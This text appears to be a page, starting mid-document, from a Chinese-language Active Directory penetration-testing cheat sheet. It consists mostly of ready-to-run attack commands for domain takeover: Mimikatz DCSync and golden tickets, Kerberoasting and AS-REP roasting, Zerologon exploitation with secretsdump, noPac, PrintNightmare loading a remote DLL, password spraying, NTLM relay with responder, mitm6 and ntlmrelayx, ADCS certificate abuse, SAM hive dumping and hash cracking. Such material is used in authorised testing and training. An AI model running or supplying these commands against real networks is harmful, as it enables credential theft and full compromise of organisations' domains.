<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:pentest.com &#x2F;user:krbtgt</span><br><span class="line"></span><br><span class="line">kerberos::purge</span><br><span class="line"></span><br><span class="line">kerberos::golden &#x2F;admin:administrator &#x2F;domain:域 &#x2F;sid:SID &#x2F;krbtgt:hash值 </span><br><span class="line">&#x2F;ticket:adinistrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::ptt administrator.kiribi</span><br><span class="line"></span><br><span class="line">kerberos::tgt</span><br><span class="line"></span><br><span class="line">net use k: \pnet use k: \pentest.comc$</span><br></pre></td></tr></table></figure>

<p>相关阅读 :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1640">https://adsecurity.org/?p=1640</a></li>
<li><a target="_blank" rel="noopener" href="http://bobao.360.cn/learning/detail/3564.html">域服务账号破解实践</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/wulantian/article/details/42418231">Kerberos的认证原理</a></li>
<li><a target="_blank" rel="noopener" href="https://klionsec.github.io/2016/08/10/ntlm-kerberos/">深刻理解windows安全认证机制ntlm＆Kerberos</a></li>
</ul>
<h5 id="Kerberos的银票务"><a href="#Kerberos的银票务" class="headerlink" title="Kerberos的银票务"></a>Kerberos的银票务</h5><p>黄金票据和白银票据的一些区别： Golden Ticket：伪造<code>TGT</code>，可以获取<code>任何Kerberos</code>服务权限 银票：伪造TGS，<code>只能访问指定的服务</code> 加密方式不同： Golden Ticket由<code>krbtgt</code>的hash加密 Silver Ticket由<code>服务账号</code>（通常为计算机账户）Hash加密 认证流程不同： 金票在使用的过程需要同域控通信 银票在使用的过程不需要同域控通信 相关阅读 :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2011">攻击者如何使用Kerberos的银票来利用系统</a></li>
<li>[域渗透——Pass The Ticket](<a target="_blank" rel="noopener" href="https://www.feiworks.com/wy/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass">https://www.feiworks.com/wy/drops/域渗透——Pass</a> The Ticket.pdf)</li>
</ul>
<h5 id="域服务账号破解"><a href="#域服务账号破解" class="headerlink" title="域服务账号破解"></a>域服务账号破解</h5><p>与上面SPN扫描类似的原理 <a target="_blank" rel="noopener" href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> 获取所有用作SPN的帐户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T PENTEST.com -Q *&#x2F;*</span><br></pre></td></tr></table></figure>

<p>从Mimikatz的RAM中提取获得的门票</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list &#x2F;export</span><br></pre></td></tr></table></figure>

<p>用rgsrepcrack破解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi</span><br></pre></td></tr></table></figure>

<h5 id="凭证盗窃"><a href="#凭证盗窃" class="headerlink" title="凭证盗窃"></a>凭证盗窃</h5><p>从搜集的密码里面找管理员的密码</p>
<h5 id="NTLM-relay"><a href="#NTLM-relay" class="headerlink" title="NTLM relay"></a>NTLM relay</h5><ul>
<li><a target="_blank" rel="noopener" href="https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/">One API call away from Domain Admin</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/privexchange/">privexchange</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/ridter/exchange2domain">Exchange2domain</a></li>
</ul>
<p>用于主动让目标机器发起NTLM请求的方法：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">printerbug</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">PetitPotam</a></li>
</ul>
<p>Relay LDAP:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2019-1040-dcpwn">CVE-2019-1040-dcpwn</a></li>
</ul>
<p>Relay AD CS/PKI:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/">AD CS/PKI template exploit</a></li>
</ul>
<p>集成几个利用的工具：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/Relayx">Relayx</a></li>
</ul>
<p>内网445端口转发：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/praetorian-inc/PortBender">PortBender</a></li>
</ul>
<h5 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h5><ul>
<li><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">Wagging-the-Dog.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/">s4u2pwnage</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2931">Attacking Kerberos Delegation</a></li>
<li><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=4056">用打印服务获取域控</a></li>
<li><a target="_blank" rel="noopener" href="https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/">Computer Takeover</a></li>
<li><a target="_blank" rel="noopener" href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">Combining NTLM Relaying and Kerberos delegation</a></li>
<li><a target="_blank" rel="noopener" href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">CVE-2019-1040</a></li>
</ul>
<h5 id="地址解析协议"><a href="#地址解析协议" class="headerlink" title="地址解析协议"></a>地址解析协议</h5><p>实在搞不定再搞ARP</p>
<h5 id="zerologon漏洞"><a href="#zerologon漏洞" class="headerlink" title="zerologon漏洞"></a>zerologon漏洞</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py &lt;MACHINE_BIOS_NAME&gt; &lt;ip&gt;</span><br><span class="line"></span><br><span class="line">secretsdump.py &lt;DOMAIN&gt;&#x2F;&lt;MACHINE_BIOS_NAME&gt;\$@&lt;IP&gt; -no-pass -just-dc-user &quot;Administrator&quot; </span><br><span class="line"></span><br><span class="line">secretsdump.py -hashes :&lt;HASH_admin&gt; &lt;DOMAIN&gt;&#x2F;Administrator@&lt;IP&gt;</span><br><span class="line"></span><br><span class="line">python3 restorepassword.py -target-ip &lt;IP&gt; &lt;DOMAIN&gt;&#x2F;&lt;MACHINE_BIOS_NAME&gt;@&lt;MACHINE_BIOS_NAME&gt; -hexpass &lt;HEXPASS&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://0range-x.github.io/2021/11/22/CVE-2020-1472/">CVE-2020-1472的分析与复现 (0range-x.github.io)</a></p>
<p>**1、利用Mimikatz **check</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon &#x2F;target:dc1.exploit.local &#x2F;account:dc1$</span><br></pre></td></tr></table></figure>

<p><strong>exploit</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::zerologon &#x2F;target:dc1.exploit.local &#x2F;account:dc1$ &#x2F;exploit</span><br></pre></td></tr></table></figure>

<p><strong>dcsync</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;dc:dc1.exploit.local &#x2F;authuser:dc1$ &#x2F;authdomain:exploit.local &#x2F;authpassword:&quot;&quot; &#x2F;domain:exploit.local &#x2F;authntlm &#x2F;user:krbtgt</span><br></pre></td></tr></table></figure>

<p><strong>restore</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::postzerologon &#x2F;target:conttosson.locl &#x2F;account:dc$ </span><br></pre></td></tr></table></figure>

<p><strong>2、利用impacket：</strong></p>
<ul>
<li>取目标主机名+IP</li>
<li>install 修改版本的impacket</li>
<li>Exp</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-2020-1472-exploit.py DC2008 10.211.55.200</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/ab6ebf37bf1f547e4dd044b0ffb16f8493190a988f350bc7119c5c335b7c95be/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303133372e706e67"><img src="https://camo.githubusercontent.com/ab6ebf37bf1f547e4dd044b0ffb16f8493190a988f350bc7119c5c335b7c95be/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303133372e706e67" alt="img"></a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -no-<span class="keyword">pass</span> cgdomain.com/<span class="string">&#x27;DC2008$&#x27;</span>@<span class="number">10.211</span><span class="number">.55</span><span class="number">.200</span> -history -just-dc-user administrator</span><br><span class="line">secretsdump.py -no-<span class="keyword">pass</span> cgdomain.com/administrator@<span class="number">10.211</span><span class="number">.55</span><span class="number">.200</span> -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/d94bd9f15fb2db6a2b99b7463de0674117fb227d731c7d0d8526ee66bb66961d/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303335392e706e67"><img src="https://camo.githubusercontent.com/d94bd9f15fb2db6a2b99b7463de0674117fb227d731c7d0d8526ee66bb66961d/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303335392e706e67" alt="img"></a></p>
<p>获取到旧的密码明文hex，还原</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python restorepassword.py cgdomain.com&#x2F;DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/206012e6d64974e4fda0704c8f1334e777a44f37f7b517e7d8776fbb79921e3f/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303435372e706e67"><img src="https://camo.githubusercontent.com/206012e6d64974e4fda0704c8f1334e777a44f37f7b517e7d8776fbb79921e3f/68747470733a2f2f626c6f67706963732d313235313639313238302e66696c652e6d7971636c6f75642e636f6d2f696d67732f32303230303931363139303435372e706e67" alt="img"></a></p>
<p>恢复方法2</p>
<p> 通过wmic, pass the hash 拿到域控制器中的本地管理员权限(域管)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local&#x2F;Administrator@10.211.55.38</span><br></pre></td></tr></table></figure>

<p>然后分别执行,拷贝本机中SAM数据库到本地</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">- reg save HKLM\SYSTEM system.save</span><br><span class="line">- reg save HKLM\SAM sam.save</span><br><span class="line">- reg save HKLM\SECURITY security.save</span><br><span class="line">- get system.save</span><br><span class="line">- get sam.save</span><br><span class="line">- get security.save</span><br><span class="line">- del &#x2F;f system.save</span><br><span class="line">- del &#x2F;f sam.save</span><br><span class="line">- del &#x2F;f security.save</span><br></pre></td></tr></table></figure>

<p>提取明文hash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>

<p>然后恢复。</p>
<h5 id="CVE-2021-42278-amp-amp-CVE-2021-42287"><a href="#CVE-2021-42278-amp-amp-CVE-2021-42287" class="headerlink" title="CVE-2021-42278 &amp;&amp; CVE-2021-42287"></a>CVE-2021-42278 &amp;&amp; CVE-2021-42287</h5><p><a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">sam-the-admin</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">noPac: CVE-2021-42287/CVE-2021-42278</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;noPac.exe -domain dc.com -user username -pass &#39;password&#39; &#x2F;dc owa.dc.com</span><br><span class="line">&#x2F;mAccount mAusername &#x2F;mPassword password &#x2F;service cifs &#x2F;ptt</span><br></pre></td></tr></table></figure>





<h1 id="4-列出可匿名访问的SMB共享"><a href="#4-列出可匿名访问的SMB共享" class="headerlink" title="4.列出可匿名访问的SMB共享"></a>4.列出可匿名访问的SMB共享</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a -u &quot;&quot; -p &quot;&quot; &lt;dc-ip&gt; &amp;&amp; enum4linux -a -u &quot;guest&quot; -p &quot;&quot; &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">smbmap -u &quot;&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt; &amp;&amp; smbmap -u &quot;guest&quot; -p &quot;&quot; -P 445 -H &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">smbclient -U &#39;%&#39; -L &#x2F;&#x2F;&lt;dc-ip&gt; &amp;&amp; smbclient -U &#39;guest%&#39; -L &#x2F;&#x2F;&lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">cme smb &lt;ip&gt; -u &#39;&#39; -p &#39;&#39; # 枚举可空Session访问的SMB共享</span><br><span class="line"></span><br><span class="line">cme smb &lt;ip&gt; -u &#39;a&#39; -p &#39;&#39; #枚举可匿名访问的SMB共享</span><br></pre></td></tr></table></figure>



<h1 id="5-枚举LDAP"><a href="#5-枚举LDAP" class="headerlink" title="5.枚举LDAP"></a>5.枚举LDAP</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -sV --script &quot;ldap* and not brute&quot; -p 389 &lt;dc-ip&gt;</span><br><span class="line"></span><br><span class="line">ldapsearch -x -h &lt;ip&gt; -s base  </span><br></pre></td></tr></table></figure>



<h1 id="6-查找用户名"><a href="#6-查找用户名" class="headerlink" title="6.查找用户名"></a>6.查找用户名</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -U &lt;dc-ip&gt; | grep &#39;user:&#39;</span><br><span class="line"></span><br><span class="line">crackmapexec smb &lt;ip&gt; -u &lt;user&gt; -p &#39;&lt;password&gt;&#39; --users </span><br><span class="line"></span><br><span class="line">nmap -p 88 --script&#x3D;krb5-enum-users --script-args&#x3D;&quot;krb5-enum-users.realm&#x3D;&#39;&lt;domain&gt;&#39;,userdb&#x3D;&lt;users_list_file&gt;&quot; &lt;ip&gt; </span><br><span class="line"></span><br><span class="line">OSINT - 在互联网上寻找用户名</span><br></pre></td></tr></table></figure>



<h2 id="得到账号，但是没有密码"><a href="#得到账号，但是没有密码" class="headerlink" title="得到账号，但是没有密码"></a>得到账号，但是没有密码</h2><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">获取域密码策略 ：</span><br><span class="line">crackmapexec &lt;IP&gt; -u &#39;user&#39; -p &#39;password&#39; --pass-pol</span><br><span class="line">enum4linx -u &#39;username&#39; -p &#39;password&#39; -P &lt;IP&gt;</span><br><span class="line"></span><br><span class="line">cme smb &lt;dc-ip&gt; -u user.txt -p password.txt --no-bruteforce # 不爆破，只测试单一的 user&#x3D;password</span><br><span class="line"></span><br><span class="line">cme smb &lt;dc-ip&gt; -u user.txt -p password.txt # 交叉爆破，根据密码策略，失败过多可能会被封禁</span><br></pre></td></tr></table></figure>



<h3 id="ASREP-Roasting攻击"><a href="#ASREP-Roasting攻击" class="headerlink" title="ASREP-Roasting攻击"></a>ASREP-Roasting攻击</h3><h4 id="获取hash"><a href="#获取hash" class="headerlink" title="获取hash"></a>获取hash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py &lt;domain&gt;&#x2F; -usersfile &lt;usernames.txt&gt; -format hashcat -outputfile &lt;hashes.domain.txt&gt;</span><br><span class="line"></span><br><span class="line">Rubeus asreproast &#x2F;format:hashcat</span><br></pre></td></tr></table></figure>



<h4 id="获取ASREP-Roastable账号"><a href="#获取ASREP-Roastable账号" class="headerlink" title="获取ASREP-Roastable账号"></a>获取ASREP-Roastable账号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -PreauthNotRequired -Properties SamAccountName</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;dontreqpreauth:true&#125;), (c:Computer), p&#x3D;shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure>



<h2 id="拿到任意一个域用户的账号密码"><a href="#拿到任意一个域用户的账号密码" class="headerlink" title="拿到任意一个域用户的账号密码"></a>拿到任意一个域用户的账号密码</h2><h3 id="获取其他账户密码"><a href="#获取其他账户密码" class="headerlink" title="获取其他账户密码"></a>获取其他账户密码</h3><h4 id="1-获取域内所有账户名"><a href="#1-获取域内所有账户名" class="headerlink" title="1.获取域内所有账户名"></a>1.获取域内所有账户名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetADUsers.py -all -dc-ip &lt;dc_ip&gt; &lt;domain&gt;&#x2F;&lt;username&gt;</span><br></pre></td></tr></table></figure>

<h4 id="2-枚举-SMB-共享"><a href="#2-枚举-SMB-共享" class="headerlink" title="2.枚举 SMB 共享"></a>2.枚举 SMB 共享</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; --shares</span><br></pre></td></tr></table></figure>

<h4 id="3-bloodhound"><a href="#3-bloodhound" class="headerlink" title="3.bloodhound"></a>3.bloodhound</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d &lt;domain&gt; -u &lt;user&gt; -p &lt;password&gt; -gc &lt;dc&gt; -c all</span><br></pre></td></tr></table></figure>

<h4 id="4-powerview-pywerview"><a href="#4-powerview-pywerview" class="headerlink" title="4.powerview / pywerview"></a>4.powerview / pywerview</h4><h3 id="Kerberoasting攻击"><a href="#Kerberoasting攻击" class="headerlink" title="Kerberoasting攻击"></a>Kerberoasting攻击</h3><h4 id="获取hash-1"><a href="#获取hash-1" class="headerlink" title="获取hash"></a>获取hash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py -request -dc-ip &lt;dc_ip&gt; &lt;domain&gt;&#x2F;&lt;user&gt;:&lt;password&gt;</span><br><span class="line"></span><br><span class="line">Rubeus kerberoast</span><br></pre></td></tr></table></figure>



<h4 id="查找-kerberoastable-账号"><a href="#查找-kerberoastable-账号" class="headerlink" title="查找 kerberoastable 账号"></a>查找 kerberoastable 账号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;hasspn:true&#125;) RETURN u</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;hasspn:true&#125;), (c:Computer), p&#x3D;shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure>



<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>FindSMB2UPTime.py <ip></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rpcclient $&gt; lookupnames &lt;name&gt;</span><br><span class="line"></span><br><span class="line">wmic useraccount get name,sid</span><br><span class="line"></span><br><span class="line">auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksum</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">goldenPac.py -dc-ip &lt;dc_ip&gt; &lt;domain&gt;&#x2F;&lt;user&gt;:&#39;&lt;password&gt;&#39;@&lt;target&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc &quot;&lt;ticket&gt;&quot;</span><br></pre></td></tr></table></figure>



<h3 id="PrintNightmare"><a href="#PrintNightmare" class="headerlink" title="PrintNightmare"></a>PrintNightmare</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2021-1675.py &lt;domain&gt;&#x2F;&lt;user&gt;:&lt;password&gt;@&lt;target&gt; &#39;\\&lt;smb_server_ip&gt;\&lt;share&gt;\inject.dll&#39;</span><br></pre></td></tr></table></figure>



<h3 id="枚举-DNS-服务器"><a href="#枚举-DNS-服务器" class="headerlink" title="枚举 DNS 服务器"></a>枚举 DNS 服务器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnstool.py -u &#39;DOMAIN\user&#39; -p &#39;password&#39; --record &#39;*&#39; --action query &lt;dc_ip&gt;</span><br></pre></td></tr></table></figure>







<h1 id="7-relay-poisoning攻击"><a href="#7-relay-poisoning攻击" class="headerlink" title="7.relay/poisoning攻击"></a>7.relay/poisoning攻击</h1><h3 id="扫描没开启SMB签名的机器"><a href="#扫描没开启SMB签名的机器" class="headerlink" title="扫描没开启SMB签名的机器"></a>扫描没开启SMB签名的机器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS&#x2F;MASK</span><br><span class="line"></span><br><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;smb_relay</span><br><span class="line"></span><br><span class="line">cme smb $hosts --gen-relay-list relay.txt</span><br></pre></td></tr></table></figure>

<h3 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a>PetitPotam</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PetitPotam.py  -d &lt;domain&gt; &lt;listener_ip&gt; &lt;target_ip&gt;</span><br></pre></td></tr></table></figure>

<p>后续可以跟着adcs攻击</p>
<h3 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">responder -i eth0</span><br><span class="line">mitm6 -d &lt;domain&gt;</span><br></pre></td></tr></table></figure>



<h2 id="无SMB签名-开启IPv6-ADCS"><a href="#无SMB签名-开启IPv6-ADCS" class="headerlink" title="无SMB签名 || 开启IPv6 || ADCS"></a>无SMB签名 || 开启IPv6 || ADCS</h2><h3 id="1-MS08-068"><a href="#1-MS08-068" class="headerlink" title="1.MS08-068"></a>1.MS08-068</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;smb_relay 	#常用于windows2003 &#x2F; windows server2008</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 # 记得先关闭本机的 smb 和 http 服务</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -tf targets.txt </span><br></pre></td></tr></table></figure>



<h3 id="2-mitm6-i-eth0-d"><a href="#2-mitm6-i-eth0-d" class="headerlink" title="2.mitm6 -i eth0 -d "></a>2.mitm6 -i eth0 -d <domain></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -l &#x2F;tmp -socks -debug</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -6 -wh &lt;attacker_ip&gt; -t smb:&#x2F;&#x2F;&lt;target&gt; -l &#x2F;tmp -socks -debug</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldaps:&#x2F;&#x2F;&lt;dc_ip&gt; -wh &lt;attacker_ip&gt; --delegate-access</span><br><span class="line"></span><br><span class="line">getST.py -spn cifs&#x2F;&lt;target&gt; &lt;domain&gt;&#x2F;&lt;netbios_name&gt;\$ -impersonate &lt;user&gt;</span><br></pre></td></tr></table></figure>



<h3 id="3-adcs"><a href="#3-adcs" class="headerlink" title="3.adcs"></a>3.adcs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -t http:&#x2F;&#x2F;&lt;dc_ip&gt;&#x2F;certsrv&#x2F;certfnsh.asp -debug -smb2support --adcs --template DomainController</span><br><span class="line"></span><br><span class="line">Rubeus.exe asktgt &#x2F;user:&lt;user&gt; &#x2F;certificate:&lt;base64-certificate&gt; &#x2F;ptt</span><br></pre></td></tr></table></figure>



<h2 id="拿到hash破解"><a href="#拿到hash破解" class="headerlink" title="拿到hash破解"></a>拿到hash破解</h2><h4 id="1-LM"><a href="#1-LM" class="headerlink" title="1.LM"></a>1.LM</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format&#x3D;lm hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 3000 -a 3 hash.txt</span><br></pre></td></tr></table></figure>



